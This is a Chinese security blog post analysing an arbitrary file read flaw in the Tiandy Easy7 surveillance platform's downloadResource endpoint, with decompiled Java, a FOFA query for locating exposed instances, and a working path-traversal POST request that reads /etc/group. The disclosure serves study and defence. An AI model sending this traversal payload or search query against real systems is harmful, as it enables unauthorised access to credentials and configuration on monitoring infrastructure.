---
title: "天地伟业Easy7 downloadResource 文件读取漏洞"
source: https://mrxn.net/jswz/easy7-file-downloadResource-file-read.html
asset_dir: assets/天地伟业easy7-downloadresource-文件读取漏洞
---

# 天地伟业Easy7 downloadResource 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/14 08:35
- 270浏览
- [0评论](#comment)
- 29分钟阅读

深入探索

SQL

授权

服务器

---

# 漏洞简介

天地伟业Easy7是一款用于视频监控管理的软件系统。

该系统的/Easy7/rest/file/downloadResource接口存在前台任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者通过构造恶意路径参数（如/etc/passwd）可读取服务器上的任意文件，可能导致敏感信息泄露（如系统配置文件、用户凭证等）。由于天地伟业产品多用于关键基础设施领域，若存在公网暴露实例，可能带来严重的安全风险。

# 影响版本

# fofa语法

> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7\_logo\_transparent.png") && title="平台"

# 漏洞分析

深入探索

编码转换工具

文件大小转换

安全

首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。

再来看本次的漏洞接口 /Easy7/rest/file/downloadResource 的对应方法`downloadResource()`的实现逻辑

```
@Controller
@RequestMapping({"/file"})
public class CLS_REST_File {
    @Resource(
        name = "boSystemInfo"
    )
    private CLS_BO_SystemInfo boSystemInfo;
    @Resource(
        name = "boFile"
    )
    private CLS_BO_File boFile;
    @Resource(
        name = "boPROXY"
    )
    private CLS_BO_PROXY boPROXY;
    private static final Log log = LogFactory.getLog(CLS_REST_File.class);

    @RequestMapping({"/downloadResource"})
    public void downloadResource(HttpServletRequest request, HttpServletResponse response, CLS_VO_UploadFile voFile) throws IOException {
        String pathId = voFile.getSrsPathId();
        String path = voFile.getPath();
        String imagePath = Tools.getLocalPath(pathId) + path;
        CLS_VO_Result result = new CLS_VO_Result();
        String newPath = imagePath.replace("\\", "/");
        String retFilename = newPath.substring(newPath.lastIndexOf("/"));
        File isFile = new File(newPath);
        if (!isFile.exists()) {
            result.setRet(-7);
            response.getWriter().print("<script>alert(\"未找到资源\");window.close();</script>");
        } else {
            ServletOutputStream out = response.getOutputStream();
            response.setHeader("Content-disposition", "attachment;filename=" + retFilename);
            BufferedInputStream bis = null;
            BufferedOutputStream bos = null;

            try {
                InputStream inputStream = new FileInputStream(newPath);
                bis = new BufferedInputStream(inputStream);
                bos = new BufferedOutputStream(out);
                byte[] buff = new byte[2048];

                int bytesRead;
                while((bytesRead = bis.read(buff, 0, buff.length)) != -1) {
                    bos.write(buff, 0, bytesRead);
                }
```

深入探索

代码安全审计

漏洞扫描器

SQL注入检测工具

其中 `Tools.getLocalPath(pathId)` 的实现逻辑如下

```
public static String getLocalPath(String sSrsSharePathId) {
    return "/root/srsPath/" + sSrsSharePathId;
}
```

对与参数`srsPathId`没有任何过滤或校验，因此可以目录穿越到其他目录，且参数`path`也没有任何校验，最终将`imagePath`的反斜杠替换成斜杠后直接传递进`new FileInputStream(newPath);`中进行文件操作，整个过程无任何校验或过滤，因此造成任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

```
POST /Easy7/rest/file/downloadResource HTTP/1.1
Host: easy7.mrxn.net
Content-Type: application/x-www-form-urlencoded

path=group&srsPathId=../../etc/
```

[![天地伟业Easy7 downloadResource 文件读取漏洞](images/img-001-273b7c410131.webp)](https://image.mrxn.net/14103da8cb734686b03fe8a03269ddd9.webp)

成功读取到/etc/group文件内容

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
